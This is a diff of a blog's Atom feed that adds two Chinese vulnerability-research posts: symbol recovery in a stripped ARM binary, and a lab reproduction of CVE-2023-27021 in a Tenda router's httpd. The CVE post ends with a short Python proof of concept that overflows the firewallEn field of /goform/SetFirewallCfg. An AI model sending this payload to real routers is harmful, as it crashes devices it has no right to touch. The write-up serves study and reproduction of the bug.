@@ -3,24 +3,227 @@
     <id>http://example.com</id>
     <title></title>
     <link href="http://example.com" />
-    <updated>2024-04-15T08:04:30.000Z</updated>
+    <updated>2024-05-10T08:12:12.000Z</updated>
     <category term="wp" />
     <category term="靶机渗透" />
     <category term="vulnHUB" />
+    <category term="CVE-复现系列" />
     <category term="canary" />
+    <category term="堆" />
     <category term="pie" />
     <category term="格式化字符串漏洞" />
     <category term="csu" />
     <category term="rop" />
     <category term="gdb" />
-    <category term="堆" />
     <category term="格式化字符串" />
     <category term="got表" />
     <category term="srop" />
     <category term="uaf" />
     <category term="unlink" />
+    <category term="技巧" />
     <category term="got改写" />
     <category term="随机数检查" />
+    <entry>
+        <id>http://example.com/2024/05/10/%E5%85%B3%E4%BA%8E%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7%E8%A1%A8%E8%BF%99%E4%BB%B6%E4%BA%8B/</id>
+        <title>关于恢复符号表这件事</title>
+        <link rel="alternate" href="http://example.com/2024/05/10/%E5%85%B3%E4%BA%8E%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7%E8%A1%A8%E8%BF%99%E4%BB%B6%E4%BA%8B/"/>
+        <content type="html">&lt;p&gt;目标文件：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-file&#34;&gt;typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;32 位 ARM 架构，静态连接。内核版本 GUN/Linux 2.6.32 | 去符号表&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;对于修复程序我们首先要准备一个拥有完全符号的程序，使用一些方法给他导出符号表。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;因此，我们需要去编译一个与其类似的程序，用 ida 插件 rizzo，去生成其符号表内容&lt;/p&gt;
+&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 文件名: hello_arm.c&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Hello, ARM World!\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;编译内容如下：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;arm-linux-gnueabihf-gcc -static -march=armv7-a -mfloat-abi=hard -o myapp hello_arm.c&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;myapp: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.31, BuildID[sha1]=da2d1220742527123cd7cfeb41bbc4d2facbb3d5, with debug_info, not stripped&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;接下来我们需要将其用 ida 打开。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/gccarm/image-20240510152016835.png&#34; alt=&#34;image-20240510152016835&#34;&gt;&lt;/p&gt;
+&lt;p&gt;点击此处去生成符号表 (.riz)&lt;/p&gt;
+&lt;p&gt;接下来就需要再次用 ida 装载我们要恢复符号表的程序。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/gccarm/image-20240510152245888.png&#34; alt=&#34;image-20240510152245888&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/gccarm/image-20240510152301219.png&#34; alt=&#34;image-20240510152301219&#34;&gt;&lt;/p&gt;
+&lt;p&gt;部分函数恢复成功。但是因为两个程序的内核版本不同，或者将 rizzo 识别能力有限的原因。没有恢复的很好，但是确实也是恢复了。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;特殊状况：arm 的栈底指针不一定为 R11, 也有可能是其他寄存器。&lt;/p&gt;
+&lt;p&gt;​		 因为我自己编出的程序的栈底指针为 R7&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+        <category term="技巧" />
+        <updated>2024-05-10T08:12:12.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://example.com/2024/05/10/CVE-2023-27021/</id>
+        <title>CVE-2023-27021</title>
+        <link rel="alternate" href="http://example.com/2024/05/10/CVE-2023-27021/"/>
+        <content type="html">&lt;p&gt;CVE-2023-27021-tenda 路由器 - 栈溢出漏洞&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;官网下载链接为：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudGVuZGEuY29tLmNuL2Rvd25sb2FkL2RldGFpbC0yNjgwLmh0bWw=&#34;&gt;https://www.tenda.com.cn/download/detail-2680.html&lt;/span&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;去官网下载相应的产品&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#去官网下载相应的产品&#34;&gt;#&lt;/a&gt; 去官网下载相应的产品&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508183219864.png&#34; alt=&#34;image-20240508183219864&#34;&gt;&lt;/p&gt;
+&lt;p&gt;下载之后，使用 binwalk 进行解包。&lt;/p&gt;
+&lt;h3 id=&#34;解包&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#解包&#34;&gt;#&lt;/a&gt; 解包&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;binwalk -Me filename.bin&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;分解完之后的 &lt;code&gt;squashfs-root&lt;/code&gt;  即为路由器的文件系统。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;tenda 路由器的 web 启动程序通常是 bin 目录下的 httpd 文件&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;$ file httpd&lt;br&gt;
+httpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;可以看到位 arm 架构的 32 位的可执行程序&lt;/p&gt;
+&lt;h3 id=&#34;执行程序&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#执行程序&#34;&gt;#&lt;/a&gt; 执行程序&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;cp $(which qemu-arm-static) ./&lt;/p&gt;
+&lt;p&gt;sudo chroot ./ ./qemu-arm-static ./bin/httpd&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508191156518.png&#34; alt=&#34;image-20240508191156518&#34;&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;发现程序一直卡在这里，拖进 IDA 搜索字符串  &lt;code&gt;WeLoveLinux&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;查找原因&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查找原因&#34;&gt;#&lt;/a&gt; 查找原因&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508193738684.png&#34; alt=&#34;image-20240508193738684&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508193627887.png&#34; alt=&#34;image-20240508193627887&#34;&gt;&lt;/p&gt;
+&lt;p&gt;通过查看，在这里会 check_network。&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-rn&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;check_network&#34;&lt;/span&gt; *&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/netctrl: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/multiWAN: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/httpd: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/phddns: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/tendaupload: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/logserver: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: lib/libcommon.so: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;去寻找该函数在那个库里。 &lt;code&gt;libcommon.so&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508194018818.png&#34; alt=&#34;image-20240508194018818&#34;&gt;&lt;/p&gt;
+&lt;p&gt;函数主体&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508194346053.png&#34; alt=&#34;image-20240508194346053&#34;&gt;&lt;/p&gt;
+&lt;p&gt;再次寻找 &lt;code&gt;get_eth_name&lt;/code&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-rn&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;get_eth_name&#34;&lt;/span&gt; *&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/netctrl: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/dnrd: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/multiWAN: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/dhcpcd: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/httpd: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/business_proc: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/cfmd: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/time_check: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: lib/libtpi.so: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: lib/libChipApi.so: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: lib/libcommon.so: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508194612599.png&#34; alt=&#34;image-20240508194612599&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508201108424.png&#34; alt=&#34;image-20240508201108424&#34;&gt;&lt;/p&gt;
+&lt;p&gt;从这里我们就可以看到需要什么类型的虚拟网络接口了。对应前面的 &lt;code&gt;get_eth_name(0)&lt;/code&gt; ===&amp;gt; 所以我们需要 br0&lt;/p&gt;
+&lt;h3 id=&#34;建立虚拟网络接口&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#建立虚拟网络接口&#34;&gt;#&lt;/a&gt; 建立虚拟网络接口&lt;/h3&gt;
+&lt;p&gt;通过 &lt;code&gt;ifconfig&lt;/code&gt;  查看本地的网卡&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508183856764.png&#34; alt=&#34;image-20240508183856764&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;使用以下命令建立虚拟网桥并进行 UP&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;sudo brctl addbr br0 
+这个命令创建一个新的虚拟网桥（bridge），名为br0。brctl是用于管理网络网桥的命令行工具，addbr选项用于添加一个新的网桥。这里，我们添加了一个名为br0的网桥。
+
+sudo brctl addif br0 ens33
+这个命令将物理网络接口ens33添加到刚刚创建的虚拟网桥br0中。addif选项用于将网络接口添加到网桥。这样，所有通过ens33接口的网络流量都会被转发到br0网桥，从而实现多个网络接口之间的通信。
+
+sudo ifconfig br0 up
+这个命令启用（激活）虚拟网桥br0。ifconfig是一个用于配置网络接口的命令行工具。在这里，我们使用up选项来激活br0网桥，使其可以开始处理网络流量。
+
+sudo dhclient br0
+这个命令为虚拟网桥br0分配一个动态IP地址。dhclient是一个用于请求和配置动态主机配置协议（DHCP）的命令行工具。在这里，我们使用dhclient为br0网桥获取一个动态IP地址，这样它就可以与其他网络设备进行通信。
+
+sudo tunctl -t br0 -u &#39;whoami&#39;
+这个命令创建一个名为br0的虚拟网络接口。tunctl是一个用于管理虚拟网络设备的命令行工具，通常用于创建和管理TUN/TAP设备。在这里，我们使用-t选项来指定设备名称（br0），-u选项来指定拥有该设备的用户的用户名。&#39;whoami&#39;是一个shell命令，用于输出当前用户的用户名，因此这里会创建一个虚拟网络接口，其所有者为执行命令的当前用户。
+
+sudo ifconfig br0 192.168.65.1/24
+这个命令为虚拟网络接口br0分配一个静态IP地址。ifconfig是一个用于配置网络接口的命令行工具。在这里，我们使用它来为br0接口指定一个IP地址（192.168.65.1）和一个子网掩码（/24）。这意味着网络接口将使用192.168.65.1作为其IP地址，子网掩码为255.255.255.0。
+&amp;gt; sudo ifconfig br0 down &amp;amp;&amp;amp; sudo brctl delbr br0 停止网络接口并删除
+&amp;gt; sudo netstat -tulnp | grep 192.168.65.1:80 查找对应的服务
+&amp;gt; kill -9 PID kill 命令来停止它
+&amp;gt; sudo netplan apply ens33无ip修复
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508184626432.png&#34; alt=&#34;image-20240508184626432&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;再次出现问题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#再次出现问题&#34;&gt;#&lt;/a&gt; 再次出现问题&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508201807056.png&#34; alt=&#34;image-20240508201807056&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;查找原因-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查找原因-2&#34;&gt;#&lt;/a&gt; 查找原因&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508204305586.png&#34; alt=&#34;image-20240508204305586&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508204329574.png&#34; alt=&#34;image-20240508204329574&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;GPT:
+socket(1, 1, 0): 这个函数需要三个参数：
+
+第一个参数是域（domain），它指定了socket的协议族。在这个例子中，1代表AF_INET，即IPv4的因特网协议族。
+第二个参数是类型（type），它指定了socket的通信方式。在这个例子中，1代表SOCK_STREAM，表示一个面向连接的、可靠的字节流socket，通常用于TCP协议。
+第三个参数是协议（protocol），它指定了socket使用的特定协议。在这个例子中，0表示让系统选择默认协议。对于SOCK_STREAM类型的socket，通常使用TCP协议。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;所以我们暂时无法依照现在的环境去修改网络状况。&lt;/p&gt;
+&lt;p&gt;但是还有一种办法我们可以修改执行逻辑。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508205103089.png&#34; alt=&#34;image-20240508205103089&#34;&gt;&lt;/p&gt;
+&lt;p&gt;所以我们去修改这两块的逻辑&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508211506399.png&#34; alt=&#34;image-20240508211506399&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;sudo chroot ./ ./qemu-arm-static ./bin/httpd&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508211557449.png&#34; alt=&#34;image-20240508211557449&#34;&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;此时就可以正常访问了&lt;/p&gt;
+&lt;p&gt;但是当我们正常访问时，发现网页是 404，此时我们让下面的 webroot_ro 的里面文件刷进去即可。&lt;/p&gt;
+&lt;h3 id=&#34;测试漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#测试漏洞&#34;&gt;#&lt;/a&gt; 测试漏洞&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508220917436.png&#34; alt=&#34;image-20240508220917436&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;使用 IDA 逆向 httpd 文件，寻找可以造成栈溢出的函数。挖掘栈溢出漏洞，通常我们要从一些危险函数入手，第一类函数是 scanf，可能产生格式化字符串溢出漏洞，第二类是 strcpy、strcat、sprintf 等字符串拷贝函数。根据 tenda 的历史 CVE 漏洞，strcpy 函数产生的漏洞比较多，所以我们从 strcpy 入手举例。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508221310337.png&#34; alt=&#34;image-20240508221310337&#34;&gt;&lt;/p&gt;
+&lt;p&gt;我们通过这个去寻找防火墙的漏洞&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508222124288.png&#34; alt=&#34;image-20240508222124288&#34;&gt;&lt;/p&gt;
+&lt;p&gt;src 直接去复制到 dest 里，后续也没有对 dest 的长度进行检测。&lt;/p&gt;
+&lt;p&gt;还需要我们去确定这个是否可以进行传入，sub_2BA8C 是 WebGetvar (goahead 的函数，暂时还不会恢复符号表)，所以我们是可以通过这个函数进行传参的。接下来我们进行测试。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509095758402.png&#34; alt=&#34;image-20240509095758402&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509095531606.png&#34; alt=&#34;image-20240509095531606&#34;&gt;&lt;/p&gt;
+&lt;p&gt;故猜测以及目录为 goform&lt;/p&gt;
+&lt;p&gt;测试 POC 如下：&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;url &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;http://192.168.65.1/goform/SetFirewallCfg&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;header &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token string&#34;&gt;&#34;Content-Type&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;application/x-www-form-urlencoded; charset=UTF-8&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token string&#34;&gt;&#34;Cookie&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;password=hdjcvb&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;A&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;500&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;firewallEn&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; payload&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;response &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; headers&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;header&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; data&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; timeout&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;response&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;执行 POC 后：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509100524266.png&#34; alt=&#34;image-20240509100524266&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509100543004.png&#34; alt=&#34;image-20240509100543004&#34;&gt;&lt;/p&gt;
